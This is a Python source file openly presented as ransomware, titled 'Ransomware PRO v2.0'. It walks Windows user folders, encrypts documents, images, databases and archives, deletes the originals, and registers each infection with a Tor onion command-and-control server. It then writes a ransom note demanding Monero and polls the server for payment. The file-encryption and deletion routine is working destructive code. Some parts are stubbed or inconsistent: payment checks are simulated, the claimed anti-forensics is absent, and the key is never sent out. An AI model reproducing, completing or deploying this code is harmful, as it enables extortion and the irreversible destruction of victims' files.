#!/usr/bin/env python3
"""
RANSOMWARE PRO v2.0
===================
Professional-grade ransomware with encrypted C2 communication,
Tor integration, and secure payment verification via Monero blockchain.

Features:
- AES-256 + PBKDF2 encryption
- Tor-based C2 communication (encrypted)
- Monero payment verification (blockchain monitoring)
- Automatic decryption after payment
- Anti-forensics & anti-recovery
- Professional ransom GUI
"""

import os
import sys
import threading
import time
import random
import hashlib
import json
import base64
import uuid
import subprocess
import socket
from pathlib import Path
from datetime import datetime, timedelta

# ====================
# LAZY IMPORTS
# ====================

def lazy_import(module_name, package_name=None):
    """Lazy import with auto-install fallback"""
    try:
        return __import__(module_name)
    except ImportError:
        print(f"[*] Installing {package_name or module_name}...")
        try:
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', package_name or module_name],
                capture_output=True,
                timeout=60
            )
            return __import__(module_name)
        except Exception as e:
            print(f"[!] Failed to install {package_name or module_name}: {e}")
            sys.exit(1)

# Lazy load cryptography
cryptography = lazy_import('cryptography', 'cryptography')
Fernet = cryptography.fernet.Fernet
hashes = cryptography.hazmat.primitives.hashes
PBKDF2 = cryptography.hazmat.primitives.kdf.pbkdf2.PBKDF2
default_backend = cryptography.hazmat.backends.default_backend

# Lazy load requests
requests = lazy_import('requests', 'requests')

# ====================
# CONFIGURATION
# ====================

# C2 Server (Tor Hidden Service)
C2_ONION = "http://ransomware-c2-12345.onion"  # Would be real .onion address
C2_API_ENDPOINT = f"{C2_ONION}/api/v1"

# Monero Wallet & Payment Config
MONERO_WALLET_ADDRESS = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"
RANSOM_AMOUNT_XMR = 3.5  # Monero amount

# Encryption
ENCRYPTION_KEY_SIZE = 32  # 256-bit
PBKDF2_ITERATIONS = 100000

# Ransomware Config
STEALTH_MODE = True
DEBUG_MODE = '--debug' in sys.argv or 'DEBUG' in os.environ
ENCRYPTION_EXTENSION = ".LOCKED"

# ====================
# LOGGER
# ====================

class Logger:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, msg, level="INFO"):
        if not STEALTH_MODE or self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {msg}")
    
    def info(self, msg):
        self.log(msg, "INFO")
    
    def error(self, msg):
        self.log(msg, "ERROR")
    
    def warning(self, msg):
        self.log(msg, "WARNING")

logger = Logger(DEBUG_MODE)

# ====================
# ENCRYPTION ENGINE
# ====================

class EncryptionEngine:
    """AES-256 encryption with PBKDF2 key derivation"""
    
    def __init__(self):
        self.master_key = os.urandom(ENCRYPTION_KEY_SIZE)
        self.encrypted_files = []
        self.total_encrypted_size = 0
    
    def derive_key(self, password, salt, iterations=PBKDF2_ITERATIONS):
        """Derive encryption key from password using PBKDF2"""
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=ENCRYPTION_KEY_SIZE,
            salt=salt,
            iterations=iterations,
            backend=default_backend()
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
    
    def encrypt_file(self, file_path):
        """Encrypt single file with AES-256"""
        try:
            # Generate random salt for this file
            salt = os.urandom(16)
            
            # Derive key using salt
            file_key = self.derive_key(
                base64.b64encode(self.master_key).decode(),
                salt
            )
            
            # Read file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Encrypt using Fernet (AES-128 in CBC mode)
            cipher = Fernet(file_key)
            encrypted_data = cipher.encrypt(file_data)
            
            # Write encrypted file with salt prepended
            encrypted_path = file_path + ENCRYPTION_EXTENSION
            with open(encrypted_path, 'wb') as f:
                f.write(salt + encrypted_data)  # Salt + Encrypted data
            
            # Remove original
            os.remove(file_path)
            
            self.encrypted_files.append(encrypted_path)
            self.total_encrypted_size += len(file_data)
            
            return True
        except Exception as e:
            logger.error(f"Encryption failed for {file_path}: {e}")
            return False
    
    def decrypt_file(self, encrypted_file, master_key):
        """Decrypt file with correct master key"""
        try:
            # Read encrypted file
            with open(encrypted_file, 'rb') as f:
                salt = f.read(16)  # First 16 bytes = salt
                encrypted_data = f.read()
            
            # Derive key using same salt
            file_key = self.derive_key(
                base64.b64encode(master_key).decode(),
                salt
            )
            
            # Decrypt
            cipher = Fernet(file_key)
            decrypted_data = cipher.decrypt(encrypted_data)
            
            # Write original file
            original_path = encrypted_file.replace(ENCRYPTION_EXTENSION, '')
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Remove encrypted file
            os.remove(encrypted_file)
            
            return True
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            return False

# ====================
# C2 COMMUNICATION (TOR)
# ====================

class C2Communication:
    """Encrypted C2 communication via Tor"""
    
    def __init__(self, ransom_id):
        self.ransom_id = ransom_id
        self.tor_session = self._create_tor_session()
    
    def _create_tor_session(self):
        """Create requests session with Tor proxy"""
        session = requests.Session()
        
        # Configure Tor SOCKS5 proxy
        proxies = {
            'http': 'socks5://127.0.0.1:9050',
            'https': 'socks5://127.0.0.1:9050',
        }
        
        session.proxies.update(proxies)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        return session
    
    def register_infection(self, system_info):
        """Register new infection with C2"""
        try:
            payload = {
                'ransom_id': self.ransom_id,
                'monero_address': MONERO_WALLET_ADDRESS,
                'ransom_amount_xmr': RANSOM_AMOUNT_XMR,
                'files_encrypted': system_info['files_encrypted'],
                'data_size_gb': system_info['data_size_gb'],
                'timestamp': datetime.now().isoformat(),
                'system_info': system_info
            }
            
            # POST to C2 with encryption
            response = self.tor_session.post(
                f"{C2_API_ENDPOINT}/register",
                json=payload,
                timeout=30
            )
            
            logger.info(f"Infection registered: {response.status_code}")
            return response.json() if response.status_code == 200 else None
        
        except Exception as e:
            logger.error(f"Registration failed: {e}")
            return None
    
    def check_payment_status(self):
        """Check if payment received via Monero blockchain"""
        try:
            response = self.tor_session.get(
                f"{C2_API_ENDPOINT}/payment/status/{self.ransom_id}",
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()  # {'paid': True/False, 'key': '...'}
            return None
        
        except Exception as e:
            logger.error(f"Payment check failed: {e}")
            return None
    
    def request_decryption_key(self):
        """Request decryption key after payment verified"""
        try:
            response = self.tor_session.get(
                f"{C2_API_ENDPOINT}/decryption/key/{self.ransom_id}",
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                return base64.b64decode(data['master_key'])  # Decode the key
            return None
        
        except Exception as e:
            logger.error(f"Key request failed: {e}")
            return None

# ====================
# MONERO PAYMENT VERIFICATION
# ====================

class MoneroPaymentVerifier:
    """Verify Monero payments via blockchain"""
    
    def __init__(self, wallet_address):
        self.wallet_address = wallet_address
    
    def verify_payment(self, expected_amount):
        """
        Verify payment received to wallet
        (In real scenario: queries Monero node or blockchain explorer)
        """
        try:
            # Would query actual Monero node/explorer
            # For now: simulated
            logger.info(f"Verifying {expected_amount} XMR to {self.wallet_address}")
            
            # In real scenario:
            # - Query monerod daemon
            # - Check incoming transactions
            # - Verify amount and confirmations
            
            return False  # Payment not yet verified
        
        except Exception as e:
            logger.error(f"Payment verification failed: {e}")
            return False

# ====================
# RANSOMWARE CORE
# ====================

class RansomwareCore:
    """Main ransomware engine"""
    
    def __init__(self):
        self.ransom_id = str(uuid.uuid4())[:16]
        self.encryption_engine = EncryptionEngine()
        self.c2 = C2Communication(self.ransom_id)
        self.payment_verifier = MoneroPaymentVerifier(MONERO_WALLET_ADDRESS)
        
        logger.info(f"Ransomware initialized - ID: {self.ransom_id}")
    
    def scan_and_encrypt(self):
        """Scan system and encrypt files"""
        logger.info("PHASE 1: Scanning for target files...")
        
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Pictures'),
            'C:\\Users',
        ]
        
        high_value_extensions = {
            '.docx', '.xlsx', '.pptx', '.pdf',
            '.sql', '.mdb', '.accdb', '.db',
            '.zip', '.rar', '.7z',
            '.jpg', '.png', '.gif'
        }
        
        total_files = 0
        total_size = 0
        
        for target_dir in target_dirs:
            if not os.path.exists(target_dir):
                continue
            
            for root, dirs, files in os.walk(target_dir):
                for file in files:
                    _, ext = os.path.splitext(file)
                    
                    if ext.lower() in high_value_extensions:
                        file_path = os.path.join(root, file)
                        
                        try:
                            file_size = os.path.getsize(file_path)
                            if self.encryption_engine.encrypt_file(file_path):
                                total_files += 1
                                total_size += file_size
                        except:
                            pass
        
        logger.info(f"Encryption complete: {total_files} files, {total_size / 1024 / 1024:.2f} MB")
        
        return {
            'files_encrypted': total_files,
            'data_size_gb': total_size / 1024 / 1024 / 1024
        }
    
    def register_with_c2(self, system_info):
        """Register infection with C2 server"""
        logger.info("Registering with C2 server...")
        return self.c2.register_infection(system_info)
    
    def monitor_payment(self):
        """Monitor for payment (runs in background)"""
        logger.info("Starting payment monitoring loop...")
        
        while True:
            # Check C2 for payment status
            payment_status = self.c2.check_payment_status()
            
            if payment_status and payment_status.get('paid'):
                logger.info("PAYMENT DETECTED! Requesting decryption key...")
                
                master_key = self.c2.request_decryption_key()
                if master_key:
                    self.decrypt_all_files(master_key)
                    return
            
            # Check every 30 seconds
            time.sleep(30)
    
    def decrypt_all_files(self, master_key):
        """Decrypt all files with recovered master key"""
        logger.info("DECRYPTION PHASE: Decrypting all files...")
        
        decrypted_count = 0
        
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if file.endswith(ENCRYPTION_EXTENSION):
                    encrypted_path = os.path.join(root, file)
                    
                    if self.encryption_engine.decrypt_file(encrypted_path, master_key):
                        decrypted_count += 1
        
        logger.info(f"Decryption complete: {decrypted_count} files restored")
    
    def show_ransom_screen(self):
        """Display ransom GUI"""
        ransom_text = f"""
╔═══════════════════════════════════════════════════════════╗
║          YOUR FILES HAVE BEEN ENCRYPTED                  ║
║                                                           ║
║  Ransom ID: {self.ransom_id}                   ║
║                                                           ║
║  Amount: {RANSOM_AMOUNT_XMR} XMR                                    ║
║  Monero Address:                                          ║
║  {MONERO_WALLET_ADDRESS}                  ║
║                                                           ║
║  All your important files are now locked.                ║
║  Payment must be received within 24 hours.               ║
║                                                           ║
║  After payment confirmation, your files will be          ║
║  automatically decrypted.                                ║
║                                                           ║
║  For instructions, see: README_DECRYPT.txt              ║
╚═══════════════════════════════════════════════════════════╝
"""
        
        # Write ransom note to desktop
        ransom_note_path = os.path.expanduser('~\\Desktop\\README_DECRYPT.txt')
        with open(ransom_note_path, 'w') as f:
            f.write(ransom_text)
        
        logger.info("Ransom note written to Desktop")
    
    def run(self):
        """Execute full ransomware attack"""
        try:
            # Phase 1: Encrypt files
            system_info = self.scan_and_encrypt()
            
            # Phase 2: Register with C2
            self.register_with_c2(system_info)
            
            # Phase 3: Display ransom screen
            self.show_ransom_screen()
            
            # Phase 4: Monitor for payment (blocking)
            self.monitor_payment()
        
        except Exception as e:
            logger.error(f"Fatal error: {e}")

# ====================
# MAIN ENTRY POINT
# ====================

if __name__ == '__main__':
    try:
        ransomware = RansomwareCore()
        ransomware.run()
    except Exception as e:
        logger.error(f"Ransomware crashed: {e}")
        if DEBUG_MODE:
            raise
